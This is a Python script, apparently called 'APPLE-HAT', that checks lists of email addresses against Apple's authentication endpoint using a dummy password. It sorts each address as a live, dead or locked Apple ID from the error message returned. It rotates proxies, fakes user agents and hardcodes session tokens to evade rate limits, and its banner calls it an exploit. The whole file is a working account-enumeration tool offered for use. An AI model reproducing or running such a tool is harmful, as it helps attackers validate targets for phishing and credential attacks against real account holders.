# -*- coding: utf-8 -*-
# - Import library
try:

    import requests as req
    import re
    import json
    import url_parser
    import fake_useragent as gagent
    import colorama as c
    import os
    import platform as pl
    import time
    import random as h
    from urllib3.exceptions import InsecureRequestWarning
    req.packages.urllib3.disable_warnings(
        InsecureRequestWarning)  # Disable SSL Warning

except ImportError as imerr:

    print("[+] Library Error Please install all important library")
    print("[+] Install : fake_useragent, url_parser, requests, colorama")
    print("- Error: "+str(imerr))
    exit()


##### Set colors #####
red = c.Fore.LIGHTRED_EX
green = c.Fore.LIGHTGREEN_EX
yellow = c.Fore.LIGHTYELLOW_EX
genta = c.Fore.LIGHTMAGENTA_EX
blue = c.Fore.LIGHTBLUE_EX
yell = c.Fore.YELLOW

##### Confing #####
mod_save = "a+"
livem = "rzlt/live.txt"
deadm = "rzlt/dead.txt"
limitm = "rzlt/limited.txt"
timem = "rzlt/timeout.txt"
##### Session #####
ses = req.Session()


########################## Needed Functions ##########################


def fakeagent(browser_name):  # generate a fake user agent for headers

    ag = gagent.FakeUserAgent(
        cache=True, use_cache_server=True, verify_ssl=True)
    if browser_name == "chrome":
        user = ag.chrome
    elif browser_name == "firefox":
        user = ag.firefox
        return user


def ison(site, state):  # Check if the server is online
    try:
        mainsite = url_parser.get_base_url(site)
        con = req.get(mainsite).status_code
        if con == int(state):
            return True
        else:
            return False
    except IOError as err:
        print("    # - Target IS dead")


def rzlt_folder():  # Check if rzlt folder exist or not and make one
    ospath = os.path
    folder = "rzlt"
    if ospath.isdir(folder) == True:
        return True
    else:
        os.mkdir(folder)
        return False


def system_eck():  # detect your oprating system and check if supported for this script

    myOs = pl.system()
    required_system = ["Windows", "Mac", "Linux"]
    for plat in required_system:
        if plat in myOs:
            return {"supported": True, "name": myOs}
        elif plat == None:
            return {"supported": False, "name": "Undefined"}


def clear(system):  # smart cleaning for all platfrom
    commands = {
        "linux": "clear",
        "windows": "cls",
        "mac": "clear"
    }
    if (system['supported'] == True and system['name'] == "Linux" or system['name'] == "Mac"):
        return os.system(commands['linux'])
    elif (system['supported'] == True and system['name'] == "Windows"):
        return os.system(commands['windows'])
    else:
        return False
        exit()


def logo(author, date, version, title, ppid):  # logo

    logoo = """
                                            
     █████╗ ██████╗ ██████╗ ██╗     ███████╗    ██╗  ██╗ █████╗ ████████╗
    ██╔══██╗██╔══██╗██╔══██╗██║     ██╔════╝    ██║  ██║██╔══██╗╚══██╔══╝
    ███████║██████╔╝██████╔╝██║     █████╗█████╗███████║███████║   ██║   
    ██╔══██║██╔═══╝ ██╔═══╝ ██║     ██╔══╝╚════╝██╔══██║██╔══██║   ██║   
    ██║  ██║██║     ██║     ███████╗███████╗    ██║  ██║██║  ██║   ██║   
    ╚═╝  ╚═╝╚═╝     ╚═╝     ╚══════╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
    ! fb.com/name.path                         ! Good Proxys Good Rzlt   
    
    #! -Author : """+str(author)+"""
    #! -Date : """+str(date)+"""
    #! -Version : """+str(version)+"""
    #! -Title : """+str(title)+"""
    #! -Donate : """+str(ppid)+"""
    #! -Warning : """+red+""" IDMSA Is an old Exploit It can be Limited
    """

    return logoo

# Get apple Key


def getkey():  # Extract Key
    end = "https://ss.apple.com"
    key = ses.get(end).url
    pars = url_parser.parse_url(key)
    joa = str(pars['path'])
    extr = re.findall("appIdKey=(.*?)&", joa)[0]
    ses.cookies.clear()
    return extr

# Get Random Proxy


def pickproxy(txtfile):
    xfile = h.choice(open(txtfile).readlines())
    return xfile


######## End - Needed Functions ##########################


def apple_api(email, proxy):  # Apple API

    url = "https://idmsac.apple.com/authenticate"  # URL

    # Open new Session For unlimited Check --- SOON

    Env = "PROD"
    accNameLocked = "false"
    appIdKey = getkey()
    browser = ["chrome", "firefox"]
    randbrowser = h.choice(browser)

    clientInfo = {

        "U": fakeagent(randbrowser),
        "L": "fr-FR",
        "Z": "GMT+01:00",
        "V": "1.1",
        "F": "Fta44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQEjZrVgszl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWoefTPF90OkxjPm8LKfAaZ4pAJZ7OQuyPBB2SCXw2SCVL6yXyjaY1WMsiZRPrwVL6tqAhbrmQkLRUs_43wuZPup_nH2t05oaYAhrcpMxE6DBUr5xj6KkuKKjC74.gsTrhO3f9p_nH1wzQk1hCUMnGWqbPaRgwe98vDdYejftckuyPBDjaY2ftckkCoq1HACVdYFeI1bgJ6LLtQkmbFVDJhCult2uXjodUW2Reif6KPBSpHrk.Nk4JkJlo9Y_3Drf6ZE_JzH_yJhp0iKMKXJ2237lY5BSmxGY5BOgkLT0XxU..BWP"
    }

    fdcBrowserData = {

        "U": fakeagent(randbrowser),
        "L": "fr-FR",
        "Z": "GMT+01:00",
        "V": "1.1",
        "F": "Fta44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQEjZrVgszl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWoefTPF90OkxjPm8LKfAaZ4pAJZ7OQuyPBB2SCXw2SCVL6yXyjaY1WMsiZRPrwVL6tqAhbrmQkLRUs_43wuZPup_nH2t05oaYAhrcpMxE6DBUr5xj6KkuKKjC74.gsTrhO3f9p_nH1wzQk1hCUMnGWqbPaRgwe98vDdYejftckuyPBDjaY2ftckkCoq1HACVdYFeI1bgJ0VMAT5Ju30m_djLE7UJKy_Aw7Q_KpNufGYiOKw.5B0KB4BS1ctG2hult2tKEodU_ASFQ_KpN_.kl1BNlY6RjJNlY5QB4bVNjMk.BsA"
    }

    openiForgotInNewWindow = "false"
    referer = "https://idmsa.apple.com/login.html?appIdKey="+getkey()
    requestUri = "/login.html"
    scnt = "AAAAKjRDQTcwQkEwNjg0REY5OThGRkY3MkU0MEUzNkFBRjExfDcAAAF4wknZkwVm0OXggrltcwhO1Ajzop9Kx3YaUCtLvznwS13dWO9M8Jcf+wTWJf0ACC+VmOLD9QUZAP1ukEvh+oVmcMMU/wvsC1VL2irgXNy5ZlbVASlq"
    headers = {
        'Cookie': 'JSESSIONID=9525DE46BAD634E945F96BD384F20C48; dslang=US-EN',
        'User-Agent': fakeagent(randbrowser),
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    datap = {
        "Env": Env,
        "accNameLocked": accNameLocked,
        "accountPassword": "0000",
        "appIdKey": appIdKey,
        "appleId": email,
        "clientInfo": clientInfo,
        "fdcBrowserData": fdcBrowserData,
        "language": "EN-EN",
        "openiForgotInNewWindow": "false",
        "referer": referer,
        "requestUri": requestUri,
        "scnt": "AAAAKjRDQTcwQkEwNjg0REY5OThGRkY3MkU0MEUzNkFBRjExfDgAAAF4wkpAOiQ/PJ4MKRc9MmL2krsJrhQeCHP8c+OmyKNryZZ1CPyj/TuwTaAjFxAACC+btzqvTdO40Ez54iRv+pjTdVPoteqFO4kHLBq918bHrxrrRNB8"
    }

    ses.cookies.clear()

    # Get Proxy
    prx = "http://"+str(pickproxy(proxy))
    x = prx.split("\n")
    proxys = {
        "http": x[0]
    }
    post = ses.post(url, data=datap, headers=headers,
                    proxies=proxys).content.decode("utf-8")
    dead = "Your account information was entered incorrectly."
    live = "Access denied. Your account does not have permission to access this application."
    limited = "This Apple ID has been locked for security reasons. Visit iForgot to reset your account"

    if dead in post:

        fsadead = open(deadm, mod_save)
        fsadead.write("\n"+email)
        print(red+"    [DSWEB19778]"+" - " +
              str(time.ctime())+" - "+"Dead : "+str(email))
        ses.cookies.clear()

    elif live in post:

        fsavalid = open(livem, mod_save)
        fsavalid.write("\n"+email)
        print(green+"    [DSWEB19778]"+" - " +
              str(time.ctime())+" - "+"Live : "+str(email))
        ses.cookies.clear()

    elif limited in post:

        fsalimit = open(limitm, mod_save)
        fsalimit.write("\n"+email)
        print(yellow+"    [DSWEB19778]"+" - " +
              str(time.ctime())+" - "+"Lock : "+str(email))
        ses.cookies.clear()
    else:
        fsatime = open(timem, mod_save)
        fsatime.write("\n"+email)
        print(genta+"    [DSWEB19778]"+" - " +
              str(time.ctime())+" - "+"Cker : "+str(email))
        ses.cookies.clear()
